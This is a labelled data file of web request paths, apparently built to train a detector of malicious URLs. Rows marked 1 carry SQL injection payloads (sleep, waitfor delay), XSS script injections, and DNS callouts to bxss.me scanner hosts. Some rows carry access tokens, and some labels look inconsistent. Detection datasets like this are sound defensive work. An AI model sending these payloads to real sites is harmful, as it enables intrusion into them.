sentences	labels
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u519b\u519b\u8d27\u8fd0\u90e8 	 0
/***/0/02/12/41/2124180_018742.jpg 	 0
/****/bmkx/jkzx/202106/w020210610415038781835.jpg 	 0
/****/fkxxfy/202110/t20211021_195555.html 	 0
/**********/system/2020/03/24/013122890.shtml 	 0
/*****/20211122/10772.html 	 0
/************/template/jcse<esi:include src=""http://bxss.me/rpb.png""/>/110105008056111/16/images/result.css 	 1
/zwxx_11337/****/202001/t20200113_1921079.html 	 0
/jsearchfront'||'/********/jcse/110105008056111/16/images/plugin/voice/hzrecorder.js 	 1
/****/system/2021/04/22'""/><script>alert(2369)</script>/013373702.shtml 	 1
/****/20201030/e109427004.html 	 0
/******/ld_cxkj_pic02_11.png 	 0
/'.gethostbyname(lc('hitpm'.'pyhtrrgdd23e5.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(111).chr(76).chr(115).chr(71).'/******/fdzdgknr/qtfdxx/ 	 1
/****/bmkx/sfgw/201610/t20161025_14216.html 	 0
socket.gethostbyname(""hitps"" ""smmyzrzva3b0d.bxss.me."")[3].to_s) ""/********/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js 	 1
/****/zt/jczwgk/plx/index_1.html 	 0
socket.gethostbyname(""hitdk"" ""knmtkqnk4c488.bxss.me."")[3].to_s) ""/*****/hfswsj/zmhdyc.html 	 1
/****/ssgs/gjzz/ 	 1
/****/20200605/e101912554.html 	 0
/zwxx_11337/****/202012/t20201201_2387436.html/index_1.html 	 0
/****/qzfwj/202004/t20200430_2053581.html 	 0
/*********/0""xor(if(now()=sysdate(),sleep(15),0))xor""z.aspx 	 1
/****/20210201/javascript:void(0); 	 1
/******/usercenter/index?qrcode=quicklyrq,3,97682,884245 	 0
/***/getallchannels?vno=3.5.0'and/**/convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1002668753')))>'0 	 1
/****/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login=&assignee_login="">alert(/777/)&false_positives=without&sort=&asc=false&commit=search 	 1
/****/mtgz/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase 	 1
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u5927\u6b66\u53e3\u533a\u77f3\u8f86\u7269\u8d44\u7ecf\u9500\u90e8 	 0
/****/20210303/javascript:void(0); 	 1
/****/zrgj/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user 	 1
/******/public/2021/10/13/109364.images/v109364_b1634094678254_app.jpg 	 0
/******/visitcount/visit.jsp?i_columnid[0]=convert(int,sys.fn_sqlvarbasetostr(hashbytes('md5','1043753939')))&i_columnid[1]==1&i_webid=1&type=1 	 1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5fd7\u4f1f\u518d\u751f\u7269\u8d44\u56de\u6536\u7ad9 	 0
/****/czgk/bmyjs/zzqfyxt/pyxrmfy/202103/">\u81ea\u6cbb\u533a\u7164\u70ad\u5730\u8d28\u5c40</a> 	 0
/zwxx_11337/****/201809/t20180912_1042696.html 	 0
/*****/20210430/javascript:void(0); 	 1
/******/_content/download.jsp?urltype=news.downloadattachurl&owner=1707212448' or 9845=2936  	 1
/**********/lj1/ 	 0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqwsjkwyh/ 	 0
/************/template/jcse/110105008056111/16/images/http://bxss.me/t/fit.txt/selectpick/css.css 	 1
/******/system/2020/06/22/013190179.shtml 	 0
/****/ztly' and 2*3*8=6*8 and 's1ff'='s1ff/xxdj/ 	 1
/***/col8/index.html"" and ""x""=""y 	 1
/***/viewspace-155.html 	 0
/****/xqdt/byq/index_26.html 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a&page=26 	 0
/****/zfwjn/1088/1096/list.html?new=/xfs.bxss.me 	 1
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u7ea2\u706b\u5730\u5e26\u70e4\u5427 	 0
/**/ui/lib//xfs.bxss.me/plugins/jquery.linkbutton.js 	 1
/****/bmkx/sswj/index_20.html 	 0
/****/gjzqq/fz/agl/201412/w020141212383483235928.gif 	 0
/****************/notification?access_token=bf6729f5-f9f2-4b95-bf1c-24a25ae2caec&id=undefined 	 0
/******/download/downfile.jsp?classid=0&filename=187b8cf8c65b4c7e97230bf0e01cd0d4.xls and 5633=5633 	 1
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202112/t20211206_197311.html 	 0
/zwxx_11337/****/201710/t20171009_503559.html 	 0
/******/system/2020/04/05/013132116.shtml 	 0
/******/jslib/jquery/jquery'||'.js 	 1
/******/public/2020/07/14/98446.images/v98446_b1594701133369_app.jpg 	 0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqtjj/202103/t20210309_2620387.html 	 0
/****/mswpmm/common/newaccount.aspx?btncancel=alert(777) 	 1
/**********/system/2021/08/31/ data:image/svg xml,<svg viewbox= 	 1
/********/wf_work_stat_setting.aspx?template_id=sys.fn_varbintohexstr(hashbytes('md5','a719s')) 	 1
/art' and 2*3*8=6*8 and 'm5rr'='m5rr/****/12/25/art_37_224319.html 	 1
/******/system/2020/05/18/013164036.shtml 	 0
/**/admin/index.php?o=panel&a=receiver.edit&id=alert(777) 	 1
/****/bmkx/sfgw/202103/w020210322356733106407.png 	 0
/****/web/search?channelid=222832&searchword=\u5317\u4eac\u6d77\u4f51\u4ed3\u7535\u5b50\u5546\u52a1\u6709\u9650\u516c\u53f8\u94f6\u5ddd\u5206\u516c\u53f8 	 0
/****/czgk/bmjs/zzqzx/zzqzxbgt/201708/t20170818_549582.html 	 0
/*****/gy42/ljcpgyview.asp?id=28329095&l2=\u022a\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u9753\u8863\u7a7a\u95f4\u670d\u88c5\u5e97 	 0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/ywdt/1.htm 	 1
/******/system/2020/03/13/013112947.shtml 	 0
/******/qhkc/jh/ 	 0
/****/zfwjn/1088/1101/list.html?new=bxss.me 	 1
/***/0/00/03/50/35073_966488.jpg 	 0
/****/zgsdt/2020_qydt/ and 1>1 	 1
/****/bmkx/sfgw/201909/t20190905_141878.html 	 0
/****/bmkx/sgaj/201904/t20190415_116436_wap.html 	 0
/****/zdlygk/gytdsdfwzs/zzq/zcwj' and 2*3*8=6*8 and 'j6qu'='j6qu.htm 	 1
/*****/system/2013/06/06/011104250.shtml 	 0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u534e\u6d77\u836f\u4e1a\u6709\u9650\u516c\u53f8 	 0
/**/news/xwygx/202109/t20210930_317985.html and 1>1 	 1
/****/admin/default/install_plugin/dasdasdasdad?plugin=math2py&source=javascript:alert(777) 	 1
/****/api/alert(777) 	 1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5fb7\u8fdc\u5b9d\u6c47\u6c7d\u8f66\u9500\u552e\u6709\u9650\u516c\u53f8 	 0
/investors-garden/**********/video/0'xor(if(now()=sysdate(),sleep(6),0))xor'z_2.html 	 1
/****/bmkx/styj/201908/w020190802580271421317.jpg 	 0
/*****/played?vno=2.3.1 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u8fdc\u884c\u65c5\u6e38\u6709\u9650\u516c\u53f8 	 0
/******/interface/rest/threatfeeds/pagedjson?namepattern=&page=0&size=25&sortcol=address&sortdir="/><script>alert(777)</script> 	 1
/******/ew/20161024141644922.jpg 	 0
/****/bmkx/sgsj/201710/t20171026_96442_wap.html 	 0
/**********/gnxw/"><script>alert(69)</script> 	 1
/***/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search 	 1
/****/wlzj/index_4.html 	 0
/*******/qiye/b-e1727098.html 	 0
/*****/system/2015/03/17/011661973.shtml 	 0
/****/zzxxgk/zrzyj/zfxxgkml_2139/ghjh_1969/list.html 	 0
/***/interface/comul_total.json.jsp?callback=jquery1111043802694271273146_1639990851564 	 0
/****/index.php?vyhl='>alert(777)&lang=cze 	 1
/****/xxgkml/qtfdxx/zcjd/szcjd/202102/t20210208_177481.html 	 0
/*****/system/2008/08/25/002585575.shtml 	 0
/***/2021/12/7/art_34_247652.html 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u987a\u4e4b\u901a\u6d77\u9c9c\u5546\u884c 	 0
/****/web/search?page=112&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10 	 0
/*/public/viewclick/?addclick=1 waitfor delay '0:0:4.2989999999999995' -- &classid=94&id=163 	 1
/****/20180412/4794.html 	 0
/*****/gy48/cpgyss.asp?key=\u4fbf\u643a\u5f0f\u78c1\u529b\u94bb\u5b54\u673a&l=\u0328\ufffd\ufffd 	 0
/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/******/fdzdgknr/qtfdxx/ 	 1
/****/czgk/bmyjs/zzqfyxt/znxrmfy/201903/">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u4e0a\u6d77\u529e\u4e8b\u5904</a> 	 0
/****/zzxxgk/tjj/zfxxgkml_2127/tjxx/pcsj/list.html?new=bxss.me/t/xss.html? 	 1
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5c0f\u5434\u76ae\u5177\u62a4\u7406\u4e2d\u5fc3 	 0
/****/thumb.php?src=<body onload=alert(777)>.jpg 	 1
/****/czgk/bmyjs/zzqgyqy/ 	 0
/*************/zwgk/qzfwj/202112/t20211215_3224595.html 	 0
/*****/gy42/cpgyss.asp?key=\u03ab\ufffd\ufffd\ufffd\u05b9\ufffd\ufffd\u06b2\ufffd\ufffd\ufffd\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd 	 0
/**********/system/2021/09/23/013455638.shtml 	 0
/****/admin/ccmanage.php?find_enc=1&list=1"><script>alert(777)</script> 	 1
/***/0/00/54/68/546831_621242.jpg 	 0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u94b2\u6da6\u8fbe\u5546\u8d38\u6709\u9650\u516c\u53f8 	 0
/****/czgk/bmyjs/gmzdp/nxqwhzzqmg/\"javascript:void(0)\" 	 1
/****************/notification?access_token=c673608b-e617-49ad-876e-6b189d83c474&id=undefined 	 0
/***/2020/8/5/art_34_216093.html 	 0
/**********/system/2020/05/23/013168657.shtml 	 0
/****/web/search?page=9&channelid=222832&searchword=\u5f20\u67f1&keyword=\u5f20\u67f1&perpage=20&outlinepage=10 	 0
/**/system/2021/12/14/012230153.shtml 	 0
/zwxx_11337/****/201907/t20190722_1623214.html 	 0
/******/system/2016/12/08/012201650.shtml 	 0
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) 	 1
/**********/system/2020/05/27/013171893.shtml 	 0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/jsxmhjyx/hjyxpj/list_1.html 	 0
/******/usercenter/index?qrcode=55831 	 0
/**/zwxmtjz/sj/wx_38894/201908/w020190822694652254344.jpg 	 0
/*******/search.asp 	 0
/***/0/01/60/12/1601235_976328.png 	 1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtasvzqg/mbf9y7ac64aaroy=&openid=ovl7jjvar5jk1bpvbqnof_jkyrli&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhb eq7mfhrq/rq87l16wm8s/oo8dbj5 fzedtzplsmcarxxu4daweyoudld7jczqmywekgdpjnzu7/jreliksyyw= 	 0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u65b0\u9f0e\u9053\u8def\u8fd0\u8f93\u670d\u52a1\u90e8 	 0
/**********/system/2020/04/07/013133846.shtml 	 0
/**********/system/2021/08/01/013428698.shtml 	 0
/zwxx_11337/****/201809/t20180919_1067187.html 	 0
/****/czgk/bmjs/zzqjcyxt/hsbqrmjcy/201808/t20180816_977986.html 	 0
/******/visitcount/visit.jsp?i_articleid=242356&i_columnid=31&i_webid=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&type=3 	 1
/******/pages/ui.php 	 0
/*******/202006/202006171502551121.html 	 0
/******/visitcount/visit.jsp?i_columnid=1&i_webid=1&type=0'xor(if(now()=sysdate(),sleep(15),0))xor'z 	 1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6052\u6d4e\u5927\u836f\u623f 	 0
socket.gethostbyname(""hitxx"" ""yrbmaqty6d7fd.bxss.me."")[3].to_s) ""/*****/1088/1105/list.html 	 1
/****/20200708/e103285169.html 	 1
/*****/images/jquery.js 	 0
/***/0/00/35/08/350843_800435.jpg 	 0
/****/js/lib'||'/jquery.js 	 1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5bcc\u6210\u5546\u5e97 	 0
/****/sj1/tjsj/202112/t20211201_3176058.html 	 0
/****/zxfw/ 	 1
/***/minip/mama/xd-mmxy.jpg 	 0
/***/viewspace-419.html 	 0
/***/resource/fonts/fontawesome-webfont.ttf?v=javascript:window.top._web_js_namespace_taint_tracer.log_execution_flow_sink() 	 1
/*****/system/2020/07/07/javascript:void(); 	 1
/****/bmkx/sswj/index_wap.html 	 0
/******/public/2021/01/05/20210105_176d15abc2d_r1_600k.mp4 	 0
/*******/ver.php 	 1
/****/system/2021/09/08/013448337.shtml 	 0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtmcoujo5pr/y8kapnoetse8=&openid=ovl7jjvko1p2uukogtcaa_xko264&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhb hg88yu pgsxl/cpxd460voo8dbj5 fzedtzplsmcarxxu4daweyoudld7jczqmyyw16fsrpwdgeqdisniqehs= 	 0
/******/system/2019/06/14/012903488.shtml 	 0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqsft/\"javascript:void(0)\" 	 1
/**********/system/2021/09/28/013457876.shtml 	 0
/***/interface/daily_clickcount.json.jsp?callback=jquery111106307284351363072_1639991190299 	 0
/****/system/2019/09/15/javascript:dozoom(12) 	 1
/******/system/2017/02/10/javascript:void(); 	 1
/****/gjzqq/index.html?continent=' or 6171=2904 and '1'='1 	 1
/****/gjzqq/index.html?continent=%') and 6401=4287  	 1
/****/20201030/e109393342.html 	 0
/****/mtgz/2012mtgz/javascript:stranbody(); 	 1
/************/action/to/init/1473117203472601088 	 0
/*************/zwxx_11337/zwdt/202112/t20211214_3220382.html 	 0
/****/izmf95-article-e112060852.html 	 0
/*******/qiye/spots-e52979.html 	 0
/*****/javascript/bootstrap/fonts/glyphicons-halflings-regular.woff2 	 0
/***/0/01/08/29/1082944_773276.jpg 	 0
/************/template/jcse/110105008056111/16/images/jquery.autocomplete.js/""><script>alert(2145)</script> 	 1
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqmzt/202002/t20200210_1948463.html 	 0
/****/202008/t20200825_2207664.html 	 0
/****/znzt/sp/index_3.html 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u9a6c\u82f1\u67b8\u675e\u8d2d\u9500\u7ecf\u7eaa\u4eba 	 0
/****/bmkx/ggjyzx/201610/w020161025705486905290.jpg 	 0
/*****/search.asp?field=my_baizi&classid=&keyword=\ufffd\ufffd\u027d\ufffd\ufffd\ufffd\ufffd\u0176\ufffd 	 0
/****/20210214/e115829239.html 	 0
/***/gfg.php 	 1
/****/fkxxfy/202110/t20211021_195558_wap.html 	 0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l2=\ufffd\ufffd\u02f3&l=\ufffd\ufffd\ufffd\ufffd 	 0
/*****/system/2013/02/07/javascript:window.print() 	 1
/****/sj1/tjxx/201902/t20190211_1277014.html 	 0
/****/xqdt/byq/202112/w020211206360548794124.jpg 	 0
/**********/system/2021/10/02/013460000.shtml 	 0
/*****/user/gallery1.php?g_name=<script>alert(77729</script> 	 1
/****/system/2009/06/04/javascript:dozoom(14) 	 1
/*****/003/004/ 	 1
/****/zgsdt/2019_qydt/201911/w020191115517156773989.jpg 	 0
/**********/system/2021/10/09/013461752.shtml 	 0
/zwxx_11337/****/202111/t20211125_3150647.html 	 0
/*******/cagdd4zt.php 	 1
/****/system/2021/04/14/javascript:void(0); 	 1
/****/20200720/e103787845.html 	 0
/if(now()=sysdate(),sleep(15),0)/********/jcse/110105008056111/16/images/plugin/voice/hzrecorder.js 	 1
/****/phpwiki/index.php?pagename=</script><script>alert(777)</script><!-- 	 1
/******/system/2008/10/31/002624816.shtml 	 0
/**/mavideo/gvideos.php?gid=1 and 1=2 	 1
/****/qzfwj/201801/t20180115_669663.html 	 0
/**/wp-admin/admin.php?where1=alert(777)&searchsubmit=buscar&page=nsp_search 	 1
/***/com/images/top-bj.jpg 	 0
/zwxx_11337/****/202002/t20200214_1954455.html 	 0
/****/tzgg/202012/t20201229_2543540.html 	 0
/****/system/2021/08/19/window.location.href?this.style.behavior=url( 	 1
/****/zdgz/2020_zdgz/202112/kjcx/jsly/ 	 0
/**********/system/2021/06/28/013409500.shtml 	 0
/**/index.php?show_record_links=1&table=products"">alert(777);&add_new_item=1 	 1
/****/gjzqq/fz/kml/201412/w020141212357640495648.jpg 	 0
/**********/system/2020/05/30/013173973.shtml 	 0
/****/scripts/booking/eventlist.php?serviceid=1337" onmouseover="alert(777) 	 1
/****/wdsjs/hfswsj/202101/t20210105_175647_wap.html 	 0
/************/template/jcse/110105008056111/16/images/plugin/waterpull'""()&%<acx><script >dsxv(9363)</script>/pinterest_grid.js 	 1
/****/czgk/bmjs/zzqdwgzbmyxsjg/wxb/\"javascript:void(0)\" 	 1
/*****/gy48/cpgyss.asp?key=\u7535\u963b\u4e1d\u600e\u4e48\u6837\u4f7f\u7528\u8bf4\u660e\u4e66&l=\ufffd\ufffd\ufffd\ufffd 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6ee8\u6cb3\u82d1\u65e9\u8336\u725b\u8089\u9762\u9986 	 0
/****/system/2020/12/02/javascript:window.close(); 	 1
/****/zfxxgk/fdzdgknr/qtfdxx/zfcwhy_40935/index_1.html 	 0
/****/zp-core/admin-upload.php?error=<script>alert(777)</script> 	 1
/**/ui/lib/security/http://bxss.me/t/fit.txt?.jpg.js 	 1
/****/zdlygk/gytdsdfwzs/zzq/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm 	 1
/**********/system/2021/10/22/013468413.shtml 	 0
/**/"" 	 0
/***/0/02/06/87/2068746_578077.jpg 	 0
/***/0/01/87/09/1870964_487540.jpg 	 0
/****/web/search?channelid=222832&searchword=退休申请时间 	 1
/****/gjzqq/oz/wkl/201412/w020141212355742443276.gif 	 0
/***/0/00/08/41/84109_652350.jpg 	 0
/******/system/2021/11/30/013487760.shtml 	 0
/*****/system/2020/09/21/javascript:window.close(); 	 1
/****/zgsdt/gzxwzgsdt/201412/t20141218_44502.html 	 0
/*****/20210927/javascript:void(0); 	 1
/if(now()=sysdate(),sleep(15),0)/*****/index.html 	 1
/****/dictionary/querydicdatabytypecode.do?typecode=ljscjswdlx 	 0
/******/20190808.swf/""><script>alert(180)</script> 	 1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u4e09\u8425\u9547\u6cbb\u5b8f\u7efc\u5408\u5546\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u91d1\u8d35\u9547\u738b\u627f\u519c\u6751\u7ecf\u7eaa\u670d\u52a1\u90e8 	 0
/***/0/01/89/07/1890711_999948.jpg 	 0
/****/20210228/e117258972.html 	 0
/****/dxzdj/201411/w020141125633303749800.jpg 	 0
/****/新河县?page='""()&%<acx><script >mfmz(9246)</script> 	 1
/******/system/2021/06/09/013399706'""/><script>alert(2289)</script>.shtml 	 1
/**/system/2021/01/26/012119042.shtml 	 0
/****/bmkx/jtysj/202007/w020200714542325975481.png 	 0
/***/0/00/03/39/33925_489686.jpg 	 0
/******/ew/20161024141320755.jpg 	 0
/**********/system/2020/06/01/013175297.shtml 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u65fa\u80dc\u755c\u79bd\u517b\u6b96\u573a 	 0
/****/system/2011/12/30/010597163.shtml 	 0
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u660a\u946b\u901a\u8baf\u90e8 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u6167\u840d\u5bb6\u5177\u7ecf\u9500\u90e8 	 0
/******/wlmtxax/wlmtxaxlx/ 	 0
/zwxx_11337/***/202011/t20201102_2273523.html 	 0
/**/images/pic_news_r2.jpg 	 0
/****/bmkx/jtysj/202008/t20200820_171353.html 	 0
/*******/qiye/b-e364601.html 	 0
/*********/f1/f1news/2020-07-30/142273.html 	 0
/****/qzfwj/5619/5630/index_8.html 	 0
/****/gfxwj/202004/t20200408_2014439.html 	 0
/**********/system/2021/10/20/013467344.shtml 	 0
/**********/system/2021/08/18/013436404.shtml 	 0
/****/status_captiveportal.php?zone='"><script>alert(777);</script> 	 1
/******/cms/www/201611/171246061n6x.jpg 	 0
/****/tzgg/ and 1=1 	 1
/**/interface/rest/threatfeeds/pagedjson?namepattern=&page=0&size=25&sortcol=address&sortdir="/><script>alert(777)</script> 	 1
/*****/img3/4.jpg 	 0
/****/whs/yw_1286/201703/t20170322_314573.html 	 0
/******/system/2014/10/24/011537182_03.shtml 	 0
/******/qhty/pys/gk/ 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u9ad8\u65b0\u6280\u672f\u5f00\u53d1\u533a\u5b8f\u53d1\u5851\u94a2\u95e8\u7a97\u52a0\u5de5\u90e8 	 0
/**********/system/2020/03/11/013110843.shtml 	 0
/*******/f5z8cq33.php 	 1
/****/app?adminemail=<script>alert(777)</script>&smtpserver=127.0.0.1&smtpport=25&smtpuser=<script>alert(777)</script>&smtppassword=admin&smtpsecurity=none&proceedbutton=save&operation=config&st=savesmtp 	 1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u5fb7\u80dc\u8000\u65fa\u79cd\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e 	 0
/******/qhkc/qhzj/""><script>alert(5)</script> 	 1
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u76db\u4e16\u6d69\u8fbe\u8fd0\u8f93\u6709\u9650\u516c\u53f8 	 0
/zwxx_11337/****/index_4.html 	 0
/****/20200620/e102532247.html 	 0
/*****/003/004/404/00300440462_vw00000000000001_cc124b48.mp4 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u5c11\u798f\u7efc\u5408\u5546\u5e97 	 0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u83ab\u83ab\u7199\u978b\u5e97 	 0
/****/goform/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test 	 1
/zwxx_11337/****/ytdd/202006/t20200612_2136111.html 	 0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u6d2a\u5e7f\u9547\u9884\u6d77\u997c\u5b50\u5e97 	 0
/***/003/004/218/00300421863_c3db8d71.jpg 	 0
/***/col394/index.html/<img src="javascript:alert(5887)"> 	 1
/****/bmkx/sgtj/201810/t20181025_111015.html 	 0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqwsjkwyh/zzqwsjsw/201702/t20170208_317959.html 	 0
/******/usercenter/index?qrcode=14941 	 0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u670d\u52a1\u8d38\u6613 	 0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u4e30\u8302\u5546\u884c 	 0
/******/resource/code/news/click/dynclicks.jsp?clickid=1221&owner=1329914701&clicktype=wbnews 	 0
/****/byszf/202007/t20200701_168748.html?leader=bxss.me 	 1
/****/rsrm/202004/w020200430389809747302.jpg 	 0
/zwxx_11337/****/201802/t20180223_692774.html 	 0
/***/cgi-bin/module/sharedobjmanager/policy_new/874/policytable?vdom="'/></script><script>alert(777)</script> 	 1
/****/2020jnxc/yxzp/202006/w020200630804582521232.jpg 	 0
/****/bmkx/snmj/202009/local.replace( 	 0
/****/zzxxgk/czj/zfxxgkml_2139/czyjsxx/201906/w020190610614441885694.xls 	 0
/****/ad_js.php?aid=21&c=assert 	 1
/**********/system/2020/12/10/013299870.shtml 	 0
/**********/system/2021/08/24/013439477.shtml 	 0
/****/zt/hjbhdc/201708/t20170807_375260.html 	 0
/**********/system/2021/12/02/013488885.shtml 	 0
/****/web/search?searchword=1&channelid=287219&perpage=24%') or 8915=2233 /*&templet=1&token=1 	 1
/*********/zc4/2020-01-16/168147.html 	 0
/***/0/01/47/39/1473981_647886.jpg 	 0
/if(now()=sysdate(),sleep(15),0)/**/script/ui.js 	 1
/****/web/search?channelid=222832&searchword=\u5f6d\u9633\u53bf\u97e9\u5174\u7fe0\u9762\u6761\u52a0\u5de5\u90e8 	 0
/***/zjsjy/index.shtml 	 0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/fsaqxx/201801/t20180110_138547_wap.html 	 0
/*****/system/2020/02/27/013097013.shtml 	 0
/**********/system/2020/05/27/013171695.shtml 	 0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u827a\u5fb7\u5b57\u753b\u5e97 	 0
/****/rsrm/200808/t20080827_318754.html 	 0
/****/sj1/tjxx/202010/t20201023_2265507.html 	 0
/****/server/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c 	 1
/zwxx_11337/****/202007/t20200723_2170406.html 	 0
/****/gsry/2013_506/' and 'x'='y 	 1
/*****/gy48/cpgyss.asp?key=pvc\u5851\u6599\u7ba1\u6750\ufffd?&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd 	 0
/**/system/2021/10/14/javascript:void(0); 	 1
/******/resource/js' and 2*3*8=6*8 and 'ihdi'='ihdi/news/mp4video.js 	 1
/****/http://bxss.me/t/fit.txt/tjj/zfxxgkml_2127/xwfbh_2065/list.html 	 1
/****/web/search?channelid=222832&searchword=\u4e2d\u536b\u5e02\u534e\u5174\u5370\u5237\u5382 	 0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u65e5\u51fa\u8336\u592a\u996e\u54c1\u5b81\u9633\u5e7f\u573a\u5e97 	 0
/***/0/01/97/12/1971237_760178.jpg 	 0
/*******/827814.html 	 0
/***/0/10/91/51/10915174_797067.jpg 	 0
/******/resource/code/datainput.jsp?owner=') and 3787=3787 and '1'='1 	 1
/*******/zwgk/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqzfyjs/ 	 0
/******/usercenter/index?qrcode=80279 	 0
/****//765/s9c31aue/xhr_send?t=1633737184873 	 1
